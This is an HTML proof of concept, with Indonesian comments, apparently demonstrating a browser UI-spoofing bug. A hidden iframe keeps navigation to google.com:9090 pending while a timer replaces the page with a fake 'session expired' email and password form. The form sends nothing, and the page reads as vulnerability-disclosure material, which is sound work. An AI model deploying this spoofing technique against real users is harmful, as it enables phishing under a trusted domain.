<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PoC 2 - Prolonged UI Spoof</title>
</head>
<body>
  <div id="content">
    <h1>Step 2: Waiting for navigation...</h1>
    <p>Ketik <b>https://google.com:9090</b> di omnibox dan tekan Enter.</p>
    <div id="downloadLink" style="display: none;">
      <p>Download file contoh:</p>
      <a href="#" id="downloadBtn">Download File</a>
    </div>
  </div>

  <script>
    let triggered = false;

    // Cek apakah URL adalah https://google.com:9090
    if (window.location.href === "https://google.com:9090/") {
      document.getElementById("downloadLink").style.display = "block";  // Tampilkan link download
    }

    // Iframe untuk mensimulasikan loading lama
    let iframe = document.createElement('iframe');
    iframe.src = "https://google.com:9090";  // Non-routable IP
    iframe.style.display = "none";  // Tidak terlihat
    document.body.appendChild(iframe);

    window.onbeforeunload = function () {
      triggered = true;
    };

    // Handle download file secara dinamis saat link diklik
    document.getElementById('downloadBtn').addEventListener('click', function() {
      const blob = new Blob([`
<?php
// File PHP dinamis yang dapat didownload
header('Content-Type: text/plain');
header('Content-Disposition: attachment; filename="file_example.txt"');
echo "Ini adalah file contoh yang bisa diunduh.\n";
echo "Ini adalah baris kedua dari file.\n";
?>
      `], { type: 'application/php' });

      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = 'download.php';  // Nama file yang diunduh
      link.click();  // Trigger download
    });

    setInterval(() => {
      if (triggered) {
        document.getElementById("content").innerHTML = `
          <h1>Example Login Page</h1>
          <p>Session Anda telah berakhir, login untuk melanjutkan.</p>
          <input placeholder="Email"><br><br>
          <input type="password" placeholder="Password">
        `;
        triggered = false;
      }
    }, 50);  // Update konten tiap 50ms
  </script>
</body>
</html>
